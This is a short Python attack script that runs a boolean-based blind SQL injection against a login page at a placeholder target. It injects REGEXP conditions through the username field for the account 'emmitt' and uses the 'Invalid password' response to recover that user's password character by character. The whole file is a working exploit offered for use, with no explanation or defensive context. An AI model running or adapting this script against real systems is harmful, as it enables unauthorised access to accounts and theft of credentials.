#!/bin/python
import requests
import string

url = "http://[target]/login"


#u_param = "' OR username REGEXP '{0}.';"
u_param = "emmitt' AND password REGEXP '{0}';"
headers = {'content-type': 'application/x-www-form-urlencoded'}  

data = {'username': '', 'password': 's'}

hint = "Invalid password"
pw_chars = ['e']
all_chars = ''.join([string.ascii_lowercase,string.digits])

for char in all_chars:
	data['username'] = u_param.format(char)
	response = requests.post(url, data=data, headers=headers)
	if hint in response.text:
		print("Found char ", char)
		pw_chars.append(char)

pw_list = []
pw = ''

# slightly different query because now we're trying to determine the field's value from left to right.
u_param = "emmitt' AND password REGEXP '^{0}';"

for i in range(1,64):
	for char in pw_chars:
		test = ''.join([pw, char])
		data['username'] = u_param.format(test)
		response = requests.post(url, data=data, headers=headers)
		if hint in response.text:
			pw_list.append(char)
			pw = ''.join(pw_list)
			print("password so far:", pw)

print("password:", pw)